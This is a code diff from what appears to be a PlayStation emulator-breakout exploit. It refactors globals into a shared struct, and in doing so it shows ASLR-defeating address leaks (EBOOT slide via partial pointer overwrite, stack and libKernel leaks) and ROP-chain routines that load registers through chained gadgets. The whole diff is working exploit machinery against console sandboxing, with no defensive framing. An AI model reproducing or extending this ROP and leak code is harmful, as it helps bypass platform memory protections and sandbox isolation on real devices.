@@ -5,21 +5,13 @@
 #include <ps2/cdvd.hpp>
 #include <offsets/ps/eboot/eboot.hpp>
 
+PS::Breakout::Shared* PS::Breakout::shared = (PS::Breakout::Shared*)BREAKOUT_SHARED;
 uint32_t PS::Breakout::nStatusIndex = 0;
-
-uint32_t PS::Breakout::ebootDiff = 0;
-uint64_t PS::Breakout::stackAddress = 0;
-#ifdef LIB_KERNEL_LEAKED
-uint64_t PS::Breakout::libKernelAddress = 0;
-#endif
 
 uint32_t PS::Breakout::chainIndex = 0;
 uint64_t* PS::Breakout::chain = (uint64_t*)ROP_CHAIN;
 
 char PS::Breakout::tempVar[256];
-uint64_t PS::Breakout::gadgetRet = 0;
-uint64_t PS::Breakout::gadgetPopRaxRet = 0;
-uint64_t PS::Breakout::gadgetPopRbxRet = 0;
 
 void PS::Breakout::init()
 {
@@ -42,13 +34,15 @@ void PS::Breakout::init()
 
     // Leak LibKernel address
     #ifdef LIB_KERNEL_LEAKED
-    PS::Breakout::libKernelAddress = DEREF(EBOOT(EBOOT_SCE_KERNEL_USLEEP_STUB_PTR)) - LIB_KERNEL_SCE_KERNEL_USLEEP;
+    PS::Breakout::shared->libKernelAddress = DEREF(EBOOT(EBOOT_SCE_KERNEL_USLEEP_STUB_PTR)) - LIB_KERNEL_SCE_KERNEL_USLEEP;
+    #else
+    PS::Breakout::shared->libKernelAddress = 0;
     #endif
 
     // Set global ROP gadgets
-    PS::Breakout::gadgetRet = GADGET(RET);
-    PS::Breakout::gadgetPopRaxRet = GADGET(POP_RAX_RET);
-    PS::Breakout::gadgetPopRbxRet = GADGET(POP_RBX_RET);
+    PS::Breakout::shared->gadgetRet = GADGET(RET);
+    PS::Breakout::shared->gadgetPopRaxRet = GADGET(POP_RAX_RET);
+    PS::Breakout::shared->gadgetPopRbxRet = GADGET(POP_RBX_RET);
 }
 
 void PS::Breakout::restore()
@@ -203,8 +197,8 @@ uint32_t PS::Breakout::leakEboot()
     uint32_t ioFunctionPointerAddress = PS::Breakout::callGadgetAndGetResult(BREAKOUT_PARTIAL_POINTER_OVERWRITE_RET, 1);
 
     // ASLR EBOOT slide. If ASLR is disabled ebootDiff = 0
-    PS::Breakout::ebootDiff = ioFunctionPointerAddress - IO_REGISTER_READ_HANDLERS;
-    return PS::Breakout::ebootDiff;
+    PS::Breakout::shared->ebootDiff = ioFunctionPointerAddress - IO_REGISTER_READ_HANDLERS;
+    return PS::Breakout::shared->ebootDiff;
 }
 
 uint64_t PS::Breakout::leakStack()
@@ -213,8 +207,8 @@ uint64_t PS::Breakout::leakStack()
     uint32_t eax = EBOOT(IO_REGISTER_READ_HANDLERS);
     uint32_t esp = esp_add_eax - eax;
     uint32_t stackLeak = esp - BREAKOUT_STACK_DIFF;
-    PS::Breakout::stackAddress = (uint64_t)stackLeak | 0x700000000;
-    return PS::Breakout::stackAddress;
+    PS::Breakout::shared->stackAddress = (uint64_t)stackLeak | 0x700000000;
+    return PS::Breakout::shared->stackAddress;
 }
 
 void PS::Breakout::setupGadgetWithArgument(uint32_t gadget)
@@ -335,7 +329,7 @@ void PS::Breakout::setRSI(uint64_t rsi)
 void PS::Breakout::setR8(uint64_t r8)
 {
     PS::Breakout::setRBX(r8);
-    uint64_t gadget = VAR_TO_NATIVE(PS::Breakout::gadgetPopRaxRet);
+    uint64_t gadget = VAR_TO_NATIVE(PS::Breakout::shared->gadgetPopRaxRet);
     uint64_t gadget_off = gadget - (uint64_t)0x78;
     PS::Breakout::setRAX(gadget_off); // Pop call return into RAX
     PS::Breakout::pushChain(GADGET(MOV_R8_RBX_CALL_QWORD_OB_RAX_PLUS_0X78_CB));
@@ -345,7 +339,7 @@ void PS::Breakout::setR8(uint64_t r8)
 void PS::Breakout::setR13(uint64_t r13)
 {
     PS::Breakout::setRAX(r13);
-    uint64_t gadget = VAR_TO_NATIVE(PS::Breakout::gadgetPopRbxRet);
+    uint64_t gadget = VAR_TO_NATIVE(PS::Breakout::shared->gadgetPopRbxRet);
     uint64_t gadget_off = gadget - (uint64_t)0x08;
     PS::Breakout::setRBX(gadget_off); // Pop call return into RBX
     PS::Breakout::pushChain(GADGET(MOV_R13_RAX_CALL_QWORD_OB_RBX_PLUS_0X08_CB));
@@ -356,7 +350,7 @@ void PS::Breakout::setR9(uint64_t r9)
 {
     // Set r9d to zero (r9d & 0)
     PS::Breakout::setR13(0);
-    uint64_t gadget = VAR_TO_NATIVE(PS::Breakout::gadgetRet);
+    uint64_t gadget = VAR_TO_NATIVE(PS::Breakout::shared->gadgetRet);
     uint64_t gadget_off = gadget + (uint64_t)0x260032D7;
     PS::Breakout::setRBX(gadget_off);
     PS::Breakout::pushChain(GADGET(AND_R9D_R13D_JMP_QWORD_OB_RBX_0X260032D7_CB));
